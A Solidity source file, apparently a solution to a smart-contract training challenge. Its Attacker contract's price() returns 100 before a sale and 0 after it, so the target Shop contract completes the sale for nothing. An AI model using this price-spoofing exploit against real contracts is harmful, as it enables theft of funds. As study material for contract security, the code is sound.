pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

import "./IShop.sol";

/**
 * Performs the attack on Shop contract by spoofing then changing the price. 
 * Calling the buy() method initiates the attack. 
 */
contract Attacker {
    IShop private shop;
    
    /**
     * Gets the offered price. But this one maliciously changes the price after one call. 
     * @return (uint) the price 
     */
    function price() external returns (uint)  {
        if (shop.isSold()) {
            return 0;
        }
        else {
            return 100;
        }
    }
    
    /**
     * Initiates the attack on the Shop contract by attempting to buy something from it. 
     * @param _shopAddr the address of the target Shop contract. 
     */
    function buy(address _shopAddr) public {
        shop = IShop(_shopAddr);
        shop.buy();
    }
}